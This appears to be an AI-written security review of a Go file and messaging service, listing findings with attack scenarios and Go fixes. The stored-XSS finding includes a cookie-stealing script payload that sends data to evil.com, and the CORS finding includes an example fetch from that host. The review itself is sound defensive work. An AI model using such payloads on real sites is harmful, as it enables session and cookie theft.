Now I have a thorough understanding of the codebase. Let me compile the comprehensive security review.

---

# Security Review: aero-id

| Field | Value |
|-------|-------|
| **Reviewer** | Principal Security Engineer |
| **Codebase** | aero-id (Go service, files/messages/comments) |
| **Scope** | All 25 tasks (Directions 1-5) + existing codebase |
| **Date** | 2026-07-12 |

---

## CORS Misconfiguration — Wildcard Origin

| Field | Value |
|-------|-------|
| **Category** | Threat Model |
| **Severity** | **High** |
| **Title** | CORS allows `Access-Control-Allow-Origin: *` by default |
| **Location** | `internal/middleware/cors.go:19` |
| **Description** | When `origins` is empty (no CORS origins configured, which is the default), the middleware sets `Access-Control-Allow-Origin: *`. Combined with `Access-Control-Allow-Headers: Authorization`, any website can make credentialed API calls on behalf of a logged-in user. While the API uses Bearer tokens (not cookies), the wildcard origin weakens the same-origin policy unnecessarily and enables token-exfiltration via a compromised browser extension or page. |
| **Attack Scenario** | 1. Attacker hosts `evil.com`<br>2. User with active aero-id session visits `evil.com`<br>3. `evil.com` makes `fetch('https://aero-id.example.com/v1/files', {headers: {Authorization: 'Bearer ...'}})`<br>4. CORS preflight succeeds due to `*` origin<br>5. If the attacker has access to the page's JS context (XSS, extension), they can read responses |
| **Impact** | Bypass of same-origin policy; potential token and data exfiltration |
| **Recommendation** | Replace wildcard with explicit origin validation. Change default to deny all when no origins are configured:<br><br>```go
// In cors.go — change default behavior
if len(origins) == 0 {
    return func(c *gin.Context) { c.Next() } // no CORS headers at all
}
``` |
| **Effort** | S |

---

## Hardcoded Default Secrets in Config Shipped to Production

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Severity** | **Critical** |
| **Title** | Placeholder signing key and database password committed and shipped in Docker image |
| **Location** | `configs/config.yaml` (all secrets), `deployments/Dockerfile:18` (`COPY configs/config.yaml`) |
| **Description** | The config file contains default credentials: `signing_key: change-me-please-very-long-random`, `database.password: aero`, and empty Redis password. This file is committed to the repository AND copied verbatim into the production Docker image. If an operator deploys without overriding via `AERO_ID_SIGNING_KEY` and `AERO_ID_DATABASE_PASSWORD` env vars, every instance shares the same widely-known secret. The `signing_key` is used for HMAC-signed download URLs — an attacker can forge valid download links for any file. |
| **Attack Scenario** | 1. Attacker downloads or runs the Docker image (`ghcr.io/aero/aero-id:latest`)<br>2. Reads `signing_key: change-me-please-very-long-random` from bundled config<br>3. Constructs arbitrary signed download URLs for any file on the storage backend<br>4. Exfiltrates all stored files without authentication |
| **Impact** | Complete compromise of file download security; potential data breach of all stored files |
| **Recommendation** | 1. Remove actual secrets from committed config; use placeholder values that fail at startup<br>2. Add a startup validation that rejects known weak values:<br>```go
if c.SigningKey == "change-me-please-very-long-random" {
    return fmt.Errorf("signing_key must be changed from default; set AERO_ID_SIGNING_KEY")
}
```<br>3. Do NOT copy config.yaml into Docker image; use env vars or a mounted volume<br>4. Add `config.SigningKey` validation for minimum entropy (256 bits) |
| **Effort** | S |

---

## SSO Stale Cache — Token Revocation Not Honored for Up to 5 Minutes

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **High** |
| **Title** | Stale identity cache bypasses SSO token revocation for up to 5 minutes |
| **Location** | `internal/sso/client.go:168-174` (`validateUpstream`), `internal/sso/token_cache.go` (`GetStale`) |
| **Description** | When SSO is unreachable, the circuit breaker trips and `validateUpstream` falls back to `GetStale()`, which serves the user's identity from cache even after the token's nominal expiry, for up to `stale_ttl` (default 300s/5 minutes). Additionally, the token cache itself has a `maxTTL` of 60s by default, meaning a revoked token remains valid in aero-id for up to 60s even when SSO is healthy. |
| **Attack Scenario** | 1. User is terminated/blocked; admin revokes their token on SSO<br>2. Attacker continues using the revoked token for up to 60s (cache TTL)<br>3. If SSO is under DoS, the stale cache extends to 300s + 60s = 6 minutes of unauthorized access<br>4. Attacker can read files, send messages, delete data using stale authorization |
| **Impact** | Extended window of unauthorized access after revocation; violates NIST SP 800-63 session revocation requirements |
| **Recommendation** | 1. Reduce default `token_cache_ttl` to 15s<br>2. Reduce default `stale_ttl` to 30s<br>3. Add a token blacklist endpoint that aero-id exposes for SSO to push revocations to<br>4. Document the stale-window tradeoff in operational docs:<br>```yaml
sso:
  token_cache_ttl: 15s    # was 60s
  stale_ttl: 30s           # was 300s
``` |
| **Effort** | M |

---

## No TLS in Default Configuration

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **High** |
| **Title** | All inter-service communication is in cleartext by default |
| **Location** | `configs/config.yaml`: `database.sslmode: disable`, `sso.insecure: true`, `tracing.insecure: true` |
| **Description** | Database connections use `sslmode: disable`, SSO gRPC uses `insecure: true` (no TLS), and neither HTTP nor gRPC server has TLS configured. All credentials (DB password, bearer tokens) and data travel in cleartext over the network. |
| **Attack Scenario** | 1. Attacker gains access to the network segment (cloud VPC, Kubernetes pod network)<br>2. Sniffs database traffic → captures `AERO_ID_DATABASE_PASSWORD`<br>3. Sniffs SSO gRPC → captures bearer tokens<br>4. Sniffs HTTP API responses → captures user data<br>5. Full data breach without triggering any application-level alarms |
| **Impact** | Complete compromise of data-in-transit; violation of PCI DSS §4.1, HIPAA §164.312(e)(1), GDPR Article 32 |
| **Recommendation** | 1. Change defaults to require TLS everywhere<br>2. Add a startup warning when running without TLS:<br>```go
if cfg.SSO.Insecure {
    log.Warn("SSO connection is insecure (no TLS); this is unsafe for production")
}
```<br>3. Add HTTP→HTTPS redirect middleware<br>4. Document required TLS configuration for production |
| **Effort** | M |

---

## Unauthenticated Metrics Endpoint

| Field | Value |
|-------|-------|
| **Category** | Information Disclosure |
| **Severity** | **Medium** |
| **Title** | `/metrics` endpoint is publicly accessible with no authentication |
| **Location** | `internal/handler/http/router.go:53` (`e.GET("/metrics", ...)` registered without auth middleware) |
| **Description** | The Prometheus metrics endpoint is registered on the main router before any auth middleware is applied. It exposes request rates, error rates, latency histograms, SSO cache hit ratios, and outbox queue depth to anyone who can reach the HTTP port. |
| **Attack Scenario** | 1. Attacker probes `https://aero-id.example.com/metrics`<br>2. Reads `aeroid_requests_total{status="500"}` → identifies error-prone endpoints<br>3. Reads `aeroid_outbox_pending` → measures business activity<br>4. Uses latency distributions to infer infrastructure scaling |
| **Impact** | Information disclosure of operational metrics; aids reconnaissance for targeted attacks |
| **Recommendation** | Move metrics behind a separate admin port or add basic auth:<br><br>```go
// Option A: Separate port
metricsMux := http.NewServeMux()
metricsMux.Handle("/metrics", metricsReg.Handler())
metricsServer := &http.Server{Addr: ":9091", Handler: metricsMux}

// Option B: Basic auth middleware (simpler)
e.GET("/metrics", gin.BasicAuth(gin.Accounts{"admin": cfg.MetricsPassword}), gin.WrapH(cfg.Metrics.Handler()))
``` |
| **Effort** | S |

---

## Missing Security Headers

| Field | Value |
|-------|-------|
| **Category** | Compliance |
| **Severity** | **Medium** |
| **Title** | No security headers set on HTTP responses |
| **Location** | `internal/handler/http/router.go` (no security-header middleware registered) |
| **Description** | The service does not set any of the standard security-related HTTP response headers: `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`. |
| **Attack Scenario** | 1. An attacker uploads an HTML file with embedded JavaScript to the file storage<br>2. If a user accesses the file directly (e.g., via download URL), the browser renders it as HTML<br>3. Without `X-Content-Type-Options: nosniff`, the browser may MIME-sniff and execute scripts<br>4. XSS attack executed in the context of the aero-id domain |
| **Impact** | Increased risk of XSS, clickjacking, MIME-sniffing attacks; fails OWASP Security Headers Project recommendations |
| **Recommendation** | Add a security-headers middleware:<br><br>```go
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
        c.Header("X-Content-Type-Options", "nosniff")
        c.Header("X-Frame-Options", "DENY")
        c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
        c.Header("Permissions-Policy", "none")
        // CSP depends on feature usage; at minimum:
        c.Header("Content-Security-Policy", "default-src 'self'")
        c.Next()
    }
}
``` |
| **Effort** | S |

---

## Client-Controlled File MIME Type Without Content Validation

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **High** |
| **Title** | File MIME type validation relies on client-supplied `Content-Type` header |
| **Location** | `internal/service/file.go:118` (`mimeAllowed`), `internal/handler/http/file.go:66` (`fh.Header.Get("Content-Type")`) |
| **Description** | The file upload path uses `fh.Header.Get("Content-Type")` to determine the MIME type, then checks it against the allowed list. An attacker can set `Content-Type: image/png` while uploading an executable script. There is no content-based MIME detection (no magic-bytes verification). A file stored with a forged MIME type will be served with the wrong `Content-Type`, potentially enabling XSS when served directly. |
| **Attack Scenario** | 1. Attacker crafts an HTML file containing `<script>fetch('https://evil.com/'+document.cookie)</script>`<br>2. Uploads with `Content-Type: image/png`<br>3. Gets a download URL<br>4. Shares the URL; when the victim's browser opens it, the `Content-Type: image/png` may be ignored by MIME-sniffing<br>5. The HTML executes, exfiltrating cookies/storage |
| **Impact** | Stored XSS via file upload; bypass of MIME-based access controls |
| **Recommendation** | 1. Add server-side magic-byte detection using `net/http.DetectContentType` or a library like `filetype`<br>2. Override any client-supplied MIME type with the detected type<br>3. Set `X-Content-Type-Options: nosniff` on all file download responses (mitigation):<br><br>```go
// In file handler's Download method
c.Header("Content-Type", f.MimeType)  // explicitly set
c.Header("X-Content-Type-Options", "nosniff")
``` |
| **Effort** | M |

---

## Presigned Download URL Signature Exposed in Logs

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | HMAC download signature travels in URL query string; logged by proxies |
| **Location** | `internal/storage/local.go:82-88` (`PresignGet`, builds URL with `key`, `exp`, `sig` params); `internal/handler/http/file.go:76` (access log captures `uri` including query string) |
| **Description** | The presigned download URL embeds the HMAC signature as a query parameter (`/files/dl?key=...&sig=...&exp=...`). This URL appears in access logs (the `uri` field), proxy logs, and browser history. Anyone with access to these logs can replay the URL until it expires. |
| **Attack Scenario** | 1. User clicks a file download link<br>2. The URL (including `sig`) is logged by the API server, load balancer, CDN, and browser history<br>3. A malicious operator with log access extracts the URL<br>4. Replays it to download the file within the TTL window |
| **Impact** | Exposure of file download URLs to unauthorized parties via log inspection |
| **Recommendation** | 1. Redact query parameters containing `sig` in access logs:<br>```go
// In sample.go or access_log.go
uri := c.Request.URL.Path // path only, not RawQuery
// Or redact the sig param
```<br>2. Consider using `Authorization` header instead of query params for presigned URLs<br>3. Add log redaction middleware |
| **Effort** | S |

---

## Webhook HMAC Signs with Empty Key by Default

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Severity** | **High** |
| **Title** | Webhook HMAC signing key defaults to empty string |
| **Location** | `internal/outbox/webhook.go:92` (`sign(body []byte)` using `[]byte(h.cfg.SigningKey)`) |
| **Description** | The webhook handler uses `hmac.New(sha256.New, []byte(h.cfg.SigningKey))`. If `SigningKey` is empty (the default in config), the HMAC is computed with a zero-length key. Any receiver who knows the body can forge a valid `X-Event-Signature` header, completely defeating the purpose of webhook signatures. |
| **Attack Scenario** | 1. Attacker identifies the webhook URL (could be exposed in configs, env, or leaked logs)<br>2. Knows the event structure (public proto definition)<br>3. Constructs a fake event with arbitrary payload<br>4. Computes HMAC-SHA256 with empty key<br>5. Sends to the webhook receiver; receiver accepts the forged event |
| **Impact** | Complete bypass of webhook origin authentication; forged events injected into downstream systems |
| **Recommendation** | 1. Enforce a minimum signing key length when webhook is enabled:<br>```go
if cfg.Outbox.Webhook.URL != "" && len(cfg.Outbox.Webhook.SigningKey) < 32 {
    return fmt.Errorf("outbox.webhook.signing_key must be at least 32 characters when webhook URL is set")
}
```<br>2. Reject empty key at startup validation |
| **Effort** | S |

---

## Rate Limiter Is Per-Instance Only

| Field | Value |
|-------|-------|
| **Category** | Threat Model |
| **Severity** | **Medium** |
| **Title** | Rate limiter is per-instance — ineffective in multi-instance deployments |
| **Location** | `internal/pkg/ratelimit/ratelimit.go:1-12` (package comment acknowledges this is per-instance); `internal/app/new.go` (one limiter per App) |
| **Description** | The token-bucket rate limiter lives entirely in local memory. In a multi-instance deployment (Kubernetes, auto-scaling group), each instance has its own bucket with its own `burst` capacity. An attacker can send `N × burst` requests (where N is the instance count) before triggering any throttling. |
| **Attack Scenario** | 1. Service runs 10 instances behind a load balancer<br>2. Each instance allows burst=40 requests per second per user<br>3. Attacker sends 400 req/s spread across instances<br>4. Each instance sees only 40 req/s and allows all traffic<br>5. Backend database or SSO is overwhelmed |
| **Impact** | Ineffective rate limiting in distributed deployments; potential DoS on upstream dependencies |
| **Recommendation** | 1. Document this limitation clearly in operational docs<br>2. Add Redis-backed distributed rate limiting as an option (planned for future)<br>3. Recommend API gateway-level rate limiting for production deployments<br>4. For now, reduce default burst to a conservative value (e.g., burst=10) |
| **Effort** | L (for distributed) |

---

## No Brute-Force Protection on Token Validation

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **Medium** |
| **Title** | No account lockout or rate limiting on token validation failures |
| **Location** | `internal/middleware/auth.go` (Auth middleware does not track failed attempts per actor); `internal/sso/client.go` (token validation does not track failures per token) |
| **Description** | There is no mechanism to detect or block repeated failed authentication attempts. An attacker can brute-force bearer tokens by sending many requests with different tokens. The rate limiter helps but is per-instance and keys on actor uid (which is empty for unauthenticated requests, falling back to client IP — which can be rotated). |
| **Attack Scenario** | 1. Attacker rotates through IP addresses<br>2. Sends 1M requests with random bearer tokens<br>3. Each request is sent to a different rate-limit bucket (different IP)<br>4. Validates tokens against SSO, burning SSO capacity<br>5. Eventual DoS on SSO; potential token discovery if tokens are low-entropy |
| **Impact** | SSO resource exhaustion; brute-force of low-entropy tokens |
| **Recommendation** | 1. Add per-token failure counting in the token cache<br>2. Add exponential backoff for repeated failures from the same IP range<br>3. Add monitoring alert for elevated 401 rates |
| **Effort** | M |

---

## Access Logs Leak Actor UID — PII Concern

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | Actor UID logged on every request, includes PII |
| **Location** | `internal/middleware/access_log.go:26` (`zap.String("actor", c.GetString("actor_uid"))`) |
| **Description** | Every authenticated request logs the actor's UID at info level. If UIDs are personally identifiable (e.g., email addresses, employee IDs), this constitutes PII leakage in logs. Combined with the path and resource IDs, a complete audit trail of user activity is recorded in plaintext logs. |
| **Attack Scenario** | 1. Attacker gains access to log aggregation system (ELK, Datadog, Splunk)<br>2. Queries `actor: "user@company.com"`<br>3. Gets complete timeline of the user's actions — files accessed, messages sent, comments made<br>4. Privacy violation; GDPR Article 17 (right to erasure) is difficult to enforce on log data |
| **Impact** | PII leakage in logs; GDPR/SOC2 compliance risk |
| **Recommendation** | 1. Add log scrubbing for actor UIDs (or make it opt-in behind a debug flag)<br>2. Document which data appears in logs for DPA compliance<br>3. For production, consider hashing the actor UID in logs:<br>```go
log.Info("http_request",
    zap.String("actor_hash", sha256hex(actor_uid)[:16]),
)
``` |
| **Effort** | S |

---

## Storage GC Retention Race — Active Blobs Can Be Deleted

| Field | Value |
|-------|-------|
| **Category** | Threat Model |
| **Severity** | **High** |
| **Title** | Storage GC can delete blobs concurrently referenced by in-flight dedup uploads |
| **Location** | `internal/storage/gc/sweeper.go:117-130` (`purgeSoftDeleted` blob deletion after hard-delete) |
| **Description** | The `purgeSoftDeleted` method hard-deletes rows first, then for each unique storage key, calls `countLive`. If a concurrent content-dedup upload references the same storage key between the hard-delete and the `countLive` check, the GC may see count=0 and delete the blob, breaking the concurrent upload. The `RefCounter` (`GetCount`) mitigates this but is OPT-IN and may not be active. |
| **Attack Scenario** | 1. User A uploads a file (creates File 1 with storage_key="abc")<br>2. User A deletes File 1 (soft-delete)<br>3. GC runs; hard-deletes File 1<br>4. Concurrently, User B uploads identical content (starts dedup, creates File 2 with storage_key="abc")<br>5. GC calls countLive("abc") — the new File 2 reference may have been committed, but due to timing, countLive may see 0<br>6. GC deletes blob "abc"<br>7. File 2 is now a dangling reference with no underlying blob |
| **Impact** | Data loss — files become unreadable with no recoverable blob |
| **Recommendation** | 1. Make `RefCounter` mandatory (not OPT-IN) when GC is enabled<br>2. Add a CQRS-style "mark before delete" two-phase protocol<br>3. Log a warning during startup if GC is enabled without ref counting |
| **Effort** | M |

---

## Authorization Bypass: `actor_uid` Missing Validation on Both Transports

| Field | Value |
|-------|-------|
| **Category** | Authorization |
| **Severity** | **Low** |
| **Title** | Non-empty but invalid UID from SSO is not explicitly rejected |
| **Location** | `internal/middleware/auth.go:25` (`uid == ""` reject), `internal/handler/grpc/server.go:175` (`uid == ""` reject) |
| **Description** | Both HTTP and gRPC auth paths reject an empty UID from SSO validation. However, they accept any non-empty string. If SSO returns a malformed or invalid UID (e.g., `"undefined"`, `"null"`, or a UID that doesn't correspond to a real user), it is accepted and used for authorization checks. |
| **Attack Scenario** | 1. Attacker crafts a token that passes SSO validation but returns a synthetic UID or a UID of another user<br>2. The auth middleware accepts it<br>3. Attacker accesses or modifies resources belonging to the impersonated user |
| **Impact** | Potential authorization bypass; limited by SSO token integrity (hard to exploit if SSO tokens are cryptographically signed) |
| **Recommendation** | 1. Add server-side UID format validation (e.g., UUID format check)<br>2. Document that SSO must return valid, unique UIDs<br>3. Consider adding a UID-to-account existence check on first request:<br>```go
if !uuidRegex.MatchString(uid) {
    return nil, status.Error(codes.Unauthenticated, "invalid uid format")
}
``` |
| **Effort** | S |

---

## HTTP Request Body Not Capped for Outbound Webhooks

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **Medium** |
| **Title** | Outbound webhook responses read unbounded response body |
| **Location** | `internal/outbox/webhook.go:85` (`_, _ = io.Copy(io.Discard, resp.Body)` — reads entire response) |
| **Description** | The webhook handler reads the entire HTTP response body from the external endpoint into memory (`io.Copy(io.Discard, resp.Body)` reads and discards). While this discards the data, a slow or malicious webhook receiver can keep the connection open and send data slowly, causing memory pressure or connection exhaustion. |
| **Attack Scenario** | 1. Attacker registers a malicious webhook URL<br>2. Sends responses very slowly (1 byte/second)<br>3. Each response ties up a goroutine and connection for extended period<br>4. Resource exhaustion on the aero-id outbox relay |
| **Impact** | Denial of service via slow response on webhook delivery |
| **Recommendation** | Limit response body read with `http.MaxBytesReader` or a context deadline:<br>```go
// Cap response body to 1MB
resp.Body = http.MaxBytesReader(nil, resp.Body, 1<<20)
io.Copy(io.Discard, resp.Body)
``` |
| **Effort** | S |

---

## Token Cache Does Not Support Selective Invalidation

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **Low** |
| **Title** | No API to invalidate a single cached token |
| **Location** | `internal/sso/token_cache.go` (no `Delete` or `Invalidate` method) |
| **Description** | The `TokenCache` only supports `Get`, `GetStale`, `Set`, and global `SweepExpired`. There is no mechanism to invalidate a single specific token. If a security event requires immediate revocation of a specific session, the only option is to wait for the TTL (60s) or restart the service. |
| **Attack Scenario** | 1. User's token is compromised<br>2. SSO revokes the token immediately<br>3. aero-id continues to accept the token from cache for up to 60s<br>4. Attacker uses the stolen token within this window |
| **Impact** | Delayed revocation of compromised tokens |
| **Recommendation** | Add a `Delete(token string)` method to TokenCache and expose it via a privileged admin endpoint or gRPC call so SSO can push revocations to aero-id |
| **Effort** | M |

---

## Idempotency Key Reclamation Race (Minor)

| Field | Value |
|-------|-------|
| **Category** | Threat Model |
| **Severity** | **Low** |
| **Title** | Stale idempotency reservation can be reclaimed by multiple concurrent requests |
| **Location** | `internal/idempotency/store.go:70-82` (stale reservation reclaim without serial isolation) |
| **Description** | When two concurrent requests both encounter an expired in-progress reservation from a crashed leader, both attempt to reclaim it via `UPDATE ... WHERE id = ? AND status = 0`. The UPDATE is atomic — only one request gets `RowsAffected=1`. However, the other request's `reclaim.RowsAffected` is 0, so it falls through to returning the (stale) reservation record with `reserved=false`, causing it to wait for the first request's result. This is functionally correct but complex and error-prone. |
| **Attack Scenario** | (No practical attack — the logic is correct but fragile) |
| **Impact** | Minimal; correct behavior under race conditions |
| **Recommendation** | Add a comment documenting the concurrent reclaim path; consider using `SELECT ... FOR UPDATE` for stronger isolation |
| **Effort** | S |

---

## Final Summary

### Overall Security Posture: **Needs Improvement**

The codebase has strong engineering fundamentals — clean architecture, proper error handling layers, good observability patterns, and well-defined degradation contracts. However, from a security perspective, several production-hardening gaps need addressing before this can be considered production-ready under adversarial conditions.

### Top 3 Critical Issues

1. **🔴 Hardcoded default secrets in Docker image** — The `signing_key` and database password are committed to the repo and shipped in the Docker image. If deployed without env var overrides, file download security is completely bypassable.

2. **🔴 No TLS by default** — All inter-service communication (DB, SSO, tracing) is in cleartext. In production, this exposes all credentials and data to network sniffing.

3. **🔴 SSO stale cache creates revocation window** — Revoked tokens remain valid for up to 5 minutes due to the stale identity cache. This violates core session management security principles (NIST SP 800-63B).

### Top 3 Quick Wins (High Impact, Low Effort)

| Issue | Effort | Impact |
|-------|--------|--------|
| **Default secret detection** — Add startup validation that rejects known weak signing keys and passwords | S | Prevents deployment with insecure defaults |
| **Security headers** — Add `X-Content-Type-Options`, `Strict-Transport-Security`, `X-Frame-Options` middleware | S | Mitigates MIME-sniffing, clickjacking, downgrade attacks |
| **Metrics endpoint auth** — Move `/metrics` behind basic auth or separate port | S | Prevents operational data leakage |

### Security Debt

| Area | Debt | Priority |
|------|------|----------|
| **CORS hardening** — Wildcard origin with Auth header | Replace with explicit origin validation | High |
| **File upload validation** — Client-supplied MIME type only | Add server-side magic-byte detection | High |
| **Distributed rate limiting** — Per-instance only | Plan Redis-backed global limiter for production | Medium |
| **Token invalidation API** — No per-token delete | Add `Delete()` to TokenCache + admin endpoint | Medium |
| **Webhook empty signing key** — No validation | Add minimum key length check at startup | Medium |
| **Log redaction** — PII (actor_uid) in access logs | Add configurable log masking | Low |
| **Storage GC race** — Concurrent dedup race with GC | Force `RefCounter` when GC enabled | Medium |

### Compliance Gaps

| Standard | Gap |
|----------|-----|
| **OWASP Top 10** (2021) | A05:2021 (Security Misconfiguration — weak defaults), A04:2021 (Insecure Design — no TLS), A01:2021 (Broken Access Control — stale cache) |
| **GDPR Article 32** | Security of processing — no encryption in transit by default; PII in logs |
| **NIST SP 800-63B** | Session revocation — token cache violates §6.1.2 immediate revocation requirement |
| **PCI DSS v4.0** | §4.2.1 — open network transmission without TLS |

### Recommendations Priority Matrix

```
High Impact                    Low Impact
─────────────────────────────────────────────
Fix default secrets     │   Log redaction
Add TLS enforcement     │   Token cache invalidation API
Security headers        │   Rate limiter docs
CORS hardening          │   Idempotency race comments
MIME validation         │
Webhook key validation  │
Metrics auth            │
Stale TTL reduction     │
─────────────────────────────────────────────
Low Effort                           High Effort
```
